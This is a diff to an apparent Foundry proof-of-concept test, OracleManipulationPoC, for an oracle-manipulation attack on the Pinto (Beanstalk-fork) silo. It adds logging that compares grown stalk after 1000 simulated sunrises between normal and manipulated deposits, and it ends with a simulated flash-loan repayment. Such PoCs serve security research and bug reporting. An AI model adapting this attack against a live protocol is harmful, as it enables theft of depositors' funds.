@@ -28,6 +28,7 @@ interface IPinto {
     function grownStalkForDeposit(address account, address token, int96 stem) external view returns (uint256);
     function getTokenDepositsForAccount(address account, address token) external view returns (TokenDepositId memory);
     function getAddressAndStem(uint256 depositId) external pure returns (address token, int96 stem);
+    function siloSunrise(uint256 caseId) external;
     function pipelineConvert(
         address inputToken,
         int96[] calldata stems,
@@ -126,6 +127,11 @@ contract OracleManipulationPoC is BeanstalkDeployer {
         console.log("Resulting BDV (Normal):        ", _format6(bdvA));
         console.log("Total Stalk (Normal):          ", _format18(bdvA * 1e12 + grownA));
 
+
+        pinto.siloSunrise(1000);
+        console.log("Grownstalk amount after 1000 sunrise:", pinto.grownStalkForDeposit(DEPOSITOR, PINTO_USDC_WELL, stemA));
+        console.log("Gained grownstalk after 1000 sunrises:", pinto.grownStalkForDeposit(DEPOSITOR, PINTO_USDC_WELL, stemA) - grownA);
+
         vm.revertTo(snapshotId);
 
         // --- Scenario B: Manipulated ---
@@ -147,6 +153,10 @@ contract OracleManipulationPoC is BeanstalkDeployer {
         console.log("Resulting Grown Stalk (Manipulated):", _format18(grownB));
         console.log("Resulting BDV (Manipulated):        ", _format6(bdvB));
         console.log("Total Stalk (Manipulated):          ", _format18(bdvB * 1e12 + grownB));
+
+        pinto.siloSunrise(1000);
+        console.log("Grownstalk amount after 1000 sunrise:", pinto.grownStalkForDeposit(DEPOSITOR, PINTO_USDC_WELL, stemB));
+        console.log("Gained grownstalk after 1000 sunrises:", pinto.grownStalkForDeposit(DEPOSITOR, PINTO_USDC_WELL, stemB) - grownB);
 
         // --- Reverse Swap (Simulate Flash Loan Repayment) ---
         console.log("");
